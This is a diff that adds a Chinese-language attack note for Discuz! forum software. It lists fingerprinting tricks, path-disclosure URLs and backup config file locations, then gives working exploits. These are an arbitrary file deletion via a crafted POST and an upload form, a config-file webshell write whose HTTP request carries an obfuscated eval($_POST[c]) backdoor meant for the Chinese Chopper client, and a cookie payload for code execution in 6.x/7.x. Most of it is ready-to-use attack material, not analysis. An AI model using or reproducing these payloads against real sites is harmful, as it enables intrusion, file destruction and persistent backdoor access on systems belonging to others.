@@ -1,0 +1,86 @@
+查版本
+页面源码查找 powered by (可用)
+判断 utf8/gbk
+任意页面源码查找 charset= (可用)
+路径泄露
+api/addons/zendcheck.php
+api/addons/zendcheck52.php
+api/addons/zendcheck53.php
+source/plugin/mobile/api/1/index.php
+source/plugin/mobile/extends/module/dz_digest.php
+source/plugin/mobile/extends/module/dz_newpic.php
+source/plugin/mobile/extends/module/dz_newreply.php
+source/plugin/mobile/extends/module/dz_newthread.php
+备份文件
+./config/config_global.php.bak
+./config/config_global.php~
+./config/config_ucenter.php~
+./config/config_ucenter.php.bak
+./data/config.inc.php.bak
+./config.inc.php.bak
+漏洞介绍
+discuz <= X3.4 任意文件删除
+这里以Discuz3.2为例
+
+关键字
+Powered by Discuz! X3.2
+
+利用方法
+1.确定robots.txt存在
+重要，先确认存在再动手
+
+2.注册个帐号
+3.POST数据
+http://192.168.1.102/Discuz_X3.2_SC_UTF8/upload/home.php?mod=spacecp&ac=profile&op=base
+//POST部分
+birthprovince=../../../robots.txt&profilesubmit=1&formhash=2bc7eb9a
+这个formhash从html源码中找到
+
+如果提交数据成功，打开设置界面，可以看到出生地变成../../../robots.txt
+
+4.构造上传表单
+<form action="http://192.168.1.102/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovi
+nce]=aaaaaa" method="POST" enctype="multipart/form-data">
+<input type="file" name="birthprovince" id="file" />
+<input type="text" name="formhash" value="9945c60c"/></p>
+<input type="text" name="profilesubmit" value="1"/></p>
+<input type="submit" value="Submit" />
+</from>
+此formhash需要和第三步值相同
+
+上传成功后，将返回空白页面
+
+5.验证
+访问/robots.txt,发现已被删除
+
+x3.1 插件向配置文件写shell
+大致原理
+本意是使用字典中的Key当作注释写道配置文件
+攻击利用\r\n(PS:不该是%0d%0a吗?)逃离单行注释，也可以用?><?php绕过。
+
+EXP
+POST /utility/convert/index.php HTTP/1.1
+Host: www.test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Length: 199
+Content-Type: application/x-www-form-urlencoded
+
+a=config&source=d7.2_x2.0&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&submit=yes
+eval()中那部分内容数据为eval("$_POST[c];");
+
+菜刀连接/utility/convert/data/config.inc.php
+密码c
+
+6.x/7.x前台任意代码执行
+大致原理
+在dz的源代码里，在GPC(GET、POST、COOKIE)为1时，会将$_GET $_POST $_COOKIE中的',''等自动转义，而在GPC为0时,用addslashes进行转义。
+由于php 5.3.x及以上版本里php.ini里设置的request_order默认为GP，即$request[]指的是GET和POST，而不包括cookie，导致Discuz! 6.x/7.x 版本利用全局变量防御绕过漏洞
+
+EXP
+include/discuzcode.func.php
+
+Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui? GLOBALS[_DCACHE][smilies][replacearray]=phpinfo()?
